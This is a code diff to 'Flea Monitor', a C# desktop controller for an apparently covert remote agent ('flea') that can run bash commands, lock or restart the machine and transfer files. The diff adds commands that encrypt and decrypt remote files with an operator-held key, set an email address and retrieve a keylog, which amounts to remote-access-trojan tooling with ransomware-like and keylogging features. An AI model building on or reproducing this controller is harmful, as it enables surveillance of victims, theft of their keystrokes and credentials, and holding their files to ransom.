@@ -22,7 +22,8 @@ namespace FleaMonitor
     /// </summary>
     public partial class MainWindow : Window
     {
-        private static readonly string FLEA_MONITOR_VERSION = "Flea Monitor v0.2.2";
+        private const string FLEA_MONITOR_VERSION = "Flea Monitor v0.2.3";
+        public const int ENCYPTION_KEY_LENGTH = 32;
 
         private readonly FleaInfo _fleaInfo = new();
         private readonly FleaFTPServer _fleaFTPServer = new();
@@ -48,6 +49,10 @@ namespace FleaMonitor
             { CommandProcessor.GET_SYSTEM_INFO_COMMAND, false },
             { CommandProcessor.RESTART_COMMAND, false },
             { CommandProcessor.LOCK_SCREEN_COMMAND, false },
+            { CommandProcessor.ENCRYPT_COMMAND, true },
+            { CommandProcessor.DECRYPT_COMMAND, true },
+            { CommandProcessor.SETEMAIL_COMMAND, true },
+            { CommandProcessor.SEND_KEYLOG_COMMAND, false },
             { CommandProcessor.QUIT_COMMAND, false }
         };
 
@@ -71,6 +76,10 @@ namespace FleaMonitor
             { CommandProcessor.GET_SYSTEM_INFO_COMMAND, true },
             { CommandProcessor.RESTART_COMMAND, true },
             { CommandProcessor.LOCK_SCREEN_COMMAND, true },
+            { CommandProcessor.ENCRYPT_COMMAND, true },
+            { CommandProcessor.DECRYPT_COMMAND, true },
+            { CommandProcessor.SETEMAIL_COMMAND, true },
+            { CommandProcessor.SEND_KEYLOG_COMMAND, false },
             { CommandProcessor.QUIT_COMMAND, true }
         };
 
@@ -108,6 +117,10 @@ namespace FleaMonitor
                 CommandProcessor.GET_SYSTEM_INFO_COMMAND,
                 CommandProcessor.RESTART_COMMAND,
                 CommandProcessor.LOCK_SCREEN_COMMAND,
+                CommandProcessor.ENCRYPT_COMMAND,
+                CommandProcessor.DECRYPT_COMMAND,
+                CommandProcessor.SETEMAIL_COMMAND,
+                CommandProcessor.SEND_KEYLOG_COMMAND,
                 CommandProcessor.QUIT_COMMAND
             };
         }
@@ -345,12 +358,14 @@ namespace FleaMonitor
             };
 
             settings.fleaIPTextBlox.Text = Settings.Default.FleaIP;
+            settings.encryptionKeyTextBlox.Text = Settings.Default.EncryptionKey;
             
             var result = settings.ShowDialog();
             if (result.HasValue && result.Value)
             {                
                 //Save settings
                 Settings.Default.FleaIP = settings.fleaIPTextBlox.Text;
+                Settings.Default.EncryptionKey = settings.encryptionKeyTextBlox.Text;
                 Settings.Default.Save();
             }
         }
@@ -399,7 +414,18 @@ namespace FleaMonitor
 
         private void MenuItem_SubMenu_Download(object sender, RoutedEventArgs e) => DirListView_MouseDoubleClick(sender, null);
 
-        private async void MenuItem_SubMenu_Execute(object sender, RoutedEventArgs e)
+        private bool _isEncryptionKeyValid(string key)
+        {
+            if (key.Length != ENCYPTION_KEY_LENGTH)
+            {
+                MessageBox.Show($"Encryption key must be {ENCYPTION_KEY_LENGTH} characters long.");
+                return false;
+            }
+
+            return true;
+        }
+
+        private async Task ExecuteSubMenuItem(string cmd)
         {
             if (_commandInExecution)
             {
@@ -412,7 +438,7 @@ namespace FleaMonitor
             if (item is not null)
             {
                 var value = item.Txt;
-                if (value?.IndexOf("/") != -1 || value?.IndexOf("\\") != -1 || value == "..")
+                if (value?.IndexOf('/') != -1 || value?.IndexOf('\\') != -1 || value == "..")
                 {
                     MessageBox.Show($"{value} is a directory.");
                 }
@@ -425,21 +451,85 @@ namespace FleaMonitor
 
                     waitWindow.Show();
 
-                    var working_dir = await SendCommand(CommandProcessor.GET_WORKING_DIR_COMMAND, value, _fleaInfo);
-                    var result = await SendCommand(CommandProcessor.BASH_COMMAND, Path.Join(Encoding.UTF8.GetString(working_dir), value), _fleaInfo);
+                    if(cmd.Equals("execute"))
+                    {
+                        var working_dir = await SendCommand(CommandProcessor.GET_WORKING_DIR_COMMAND, value, _fleaInfo);
+                        var result = await SendCommand(CommandProcessor.BASH_COMMAND, Path.Join(Encoding.UTF8.GetString(working_dir), value), _fleaInfo);
 
-                    try
-                    {
-                        CommandProcessor.ProcessReply(CommandProcessor.BASH_COMMAND, value, result, _fleaInfo);
+                        try
+                        {
+                            CommandProcessor.ProcessReply(CommandProcessor.BASH_COMMAND, value, result, _fleaInfo);
+                        }
+                        catch (Exception ex)
+                        {
+                            MessageBox.Show(ex.Message, "Error", MessageBoxButton.OK, MessageBoxImage.Error);
+                        }
                     }
-                    catch (Exception ex)
+                    else if(cmd.Equals("encrypt"))
                     {
-                        MessageBox.Show(ex.Message, "Error", MessageBoxButton.OK, MessageBoxImage.Error);
+                        var key = Settings.Default.EncryptionKey;
+
+                        if (!_isEncryptionKeyValid(key))
+                        {
+                            waitWindow.Close();
+                            return;
+                        }
+
+                        value = $"{key};{value}";
+
+                        var result = await SendCommand(CommandProcessor.ENCRYPT_COMMAND, value, _fleaInfo);
+
+                        try
+                        {
+                            CommandProcessor.ProcessReply(CommandProcessor.ENCRYPT_COMMAND, value, result, _fleaInfo);
+                        }
+                        catch (Exception ex)
+                        {
+                            MessageBox.Show(ex.Message, "Error", MessageBoxButton.OK, MessageBoxImage.Error);
+                        }
+                    }
+                    else if(cmd.Equals("decrypt"))
+                    {
+                        var key = Settings.Default.EncryptionKey;
+
+                        if (!_isEncryptionKeyValid(key))
+                        {
+                            waitWindow.Close();
+                            return;
+                        }
+
+                        value = $"{key};{value}";
+
+                        var result = await SendCommand(CommandProcessor.DECRYPT_COMMAND, value, _fleaInfo);
+
+                        try
+                        {
+                            CommandProcessor.ProcessReply(CommandProcessor.DECRYPT_COMMAND, value, result, _fleaInfo);
+                        }
+                        catch (Exception ex)
+                        {
+                            MessageBox.Show(ex.Message, "Error", MessageBoxButton.OK, MessageBoxImage.Error);
+                        }
                     }
 
                     waitWindow.Close();
                 }
             }
+        }
+
+        private async void MenuItem_SubMenu_Execute(object sender, RoutedEventArgs e)
+        {
+            await ExecuteSubMenuItem("execute");
+        }
+
+        private async void MenuItem_Click_Encrypt(object sender, RoutedEventArgs e)
+        {
+            await ExecuteSubMenuItem("encrypt");
+        }
+
+        private async void MenuItem_Click_Decrypt(object sender, RoutedEventArgs e)
+        {
+            await ExecuteSubMenuItem("decrypt");
         }
     }
 }
